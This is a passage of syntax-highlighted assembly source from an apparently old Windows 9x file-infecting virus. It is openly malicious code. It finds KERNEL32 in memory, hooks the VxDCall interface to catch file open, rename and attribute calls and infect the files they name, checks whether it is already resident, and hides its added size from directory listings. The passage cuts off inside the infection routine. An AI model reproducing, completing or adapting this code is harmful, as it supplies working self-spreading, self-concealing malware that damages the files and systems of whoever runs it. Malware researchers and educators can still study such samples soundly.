                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                               </span><span class="sc1">;Overwrite far ptr</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

</span><span class="sc5">init_error</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0000013Ch</span><span class="sc4">-</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Find base address of KERNEL32.Dll (code by Jacky Qwerty)</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">SEH_ExcptBlock</span><span class="sc0">  </span><span class="sc9">macro</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,-</span><span class="sc5">cPushad</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GK32BA_L1</span><span class="sc0">
                </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">IGetK32BaseAddr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SEH_ExcptBlock</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">GK32BA_L0</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">GK32BA_L2</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">10000h</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,-</span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GK32BA_L1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,-</span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GK32BA_L1</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">eax.NT_OptionalHeader.OH_DirectoryEntries</span><span class="sc0">  \
                         </span><span class="sc5">.DE_Export.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">edx.ED_Name</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc12">'NREK'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GK32BA_L1</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc12">'23le'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GK32BA_L1</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">GK32BA_L1</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc12">'.'</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GK32BA_L1</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">202020h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc12">'LLD'</span><span class="sc0">
</span><span class="sc5">GK32BA_L1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GK32BA_L0</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">GK32BA_L2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">excpt.inc</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Hook on Windows VxDCall function</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">VxDCall_hook</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mem_delta</span><span class="sc0">                          </span><span class="sc1">;Get "in-memory"</span><span class="sc0">
</span><span class="sc5">mem_delta</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                 </span><span class="sc1">;delta offset</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mem_delta</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hook_status</span><span class="sc4">],</span><span class="sc3">"BUSY"</span><span class="sc0">  </span><span class="sc1">;Dont process our</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exit_hook</span><span class="sc0">                            </span><span class="sc1">;own calls</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">002A0010h</span><span class="sc0">                       </span><span class="sc1">;VWIN32 VxD int 21h?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_hook</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0000002Ch</span><span class="sc4">]</span><span class="sc0">
                
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2A00h</span><span class="sc0">                            </span><span class="sc1">;Get system time?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">tsr_check</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">                            </span><span class="sc1">;Open file read?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infection_edx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D01h</span><span class="sc0">                            </span><span class="sc1">;Open file</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infection_edx</span><span class="sc0">                        </span><span class="sc1">;read/write?</span><span class="sc0">
                
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7143h</span><span class="sc0">                            </span><span class="sc1">;X-Get/set attrib?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infection_edx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">714Eh</span><span class="sc0">                            </span><span class="sc1">;LFN find first file</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">714Fh</span><span class="sc0">                            </span><span class="sc1">;LFN find next file</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7156h</span><span class="sc0">                            </span><span class="sc1">;LFN rename file?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infection_edx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">716Ch</span><span class="sc0">                            </span><span class="sc1">;LFN extended open?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infection_esi</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">71A8h</span><span class="sc0">                            </span><span class="sc1">;Generate short name?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infection_esi</span><span class="sc0">

</span><span class="sc5">exit_hook</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc5">do_far_jmp</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;Do a jmp fword ptr cs:[xxxxxxxx] into original code</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">2Dh</span><span class="sc0">
</span><span class="sc5">ptr_location</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Residency check</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">tsr_check</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc3">"HPS!"</span><span class="sc0">                          </span><span class="sc1">;Is our tsr check?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_hook</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc3">"TSR?"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_hook</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc3">"YES!"</span><span class="sc0">                          </span><span class="sc1">;Already resident</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">do_far_jmp</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Stealth</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">stealth</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000028h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;Save return address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">stealth_ret</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">api_ret</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Set new ret address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000028h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">find_data</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">       </span><span class="sc1">;Save ptr2FindData</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_hook</span><span class="sc0">

</span><span class="sc5">api_ret</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;As result of the above code we will get control after</span><span class="sc0">
                </span><span class="sc1">;int21h FindFirst or FindNext funcions</span><span class="sc0">

                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">back2caller</span><span class="sc0">                          </span><span class="sc1">;Exit if fail</span><span class="sc0">

                </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">;Save all registers</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">stealth_delta</span><span class="sc0">                      </span><span class="sc1">;Delta offset used</span><span class="sc0">
</span><span class="sc5">stealth_delta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                 </span><span class="sc1">;in stealth routines</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">stealth_delta</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BFh</span><span class="sc0">                                 </span><span class="sc1">;mov edi,ptr FindData</span><span class="sc0">
</span><span class="sc5">find_data</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeHigh</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_done</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZE_PADDING</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">stealth_done</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Ptr to filename</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check_filename</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">stealth_done</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hook_status</span><span class="sc4">],</span><span class="sc3">"BUSY"</span><span class="sc0">  </span><span class="sc1">;Set busy flag</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000716Ch</span><span class="sc0">                       </span><span class="sc1">;LFN Ext Open/Create</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;Read</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;Attribute normal</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">;Open existing</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">stealth_done</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_here</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_stealth</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003F00h</span><span class="sc0">                       </span><span class="sc1">;Read bytes written</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">stealth_this</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_stealth</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">stealth_this</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">close_stealth</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003E00h</span><span class="sc0">                       </span><span class="sc1">;Close file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">

</span><span class="sc5">stealth_done</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hook_status</span><span class="sc4">],</span><span class="sc3">"FREE"</span><span class="sc0">  </span><span class="sc1">;Clear busy flag</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">;Save all registers</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">                                     </span><span class="sc1">;Return no error</span><span class="sc0">

</span><span class="sc5">back2caller</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">                                 </span><span class="sc1">;Load eax with the</span><span class="sc0">
</span><span class="sc5">stealth_ret</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                            </span><span class="sc1">;return address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Infection</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">infection_edx</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">infection_esi</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hook_status</span><span class="sc4">],</span><span class="sc3">"BUSY"</span><span class="sc0">  </span><span class="sc1">;Set busy flag</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check_filename</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_infection</span><span class="sc0">                
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ptr_filename</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">name_checksum</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">got_checksum</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">name_checksum</span><span class="sc0">
</span><span class="sc5">got_checksum</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_checksum</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exit_infection</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_checksum</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc1">;****infection filter</span><span class="sc0">
                </span><span class="sc1">;mov esi,edx</span><span class="sc0">
                </span><span class="sc1">;lodsd</span><span class="sc0">
                </span><span class="sc1">;cmp ax,"XX"</span><span class="sc0">
                </span><span class="sc1">;jne exit_infection</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00007143h</span><span class="sc0">                       </span><span class="sc1">;LFN Ext attributes</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;Retrieve attributes</span><span class="sc0">
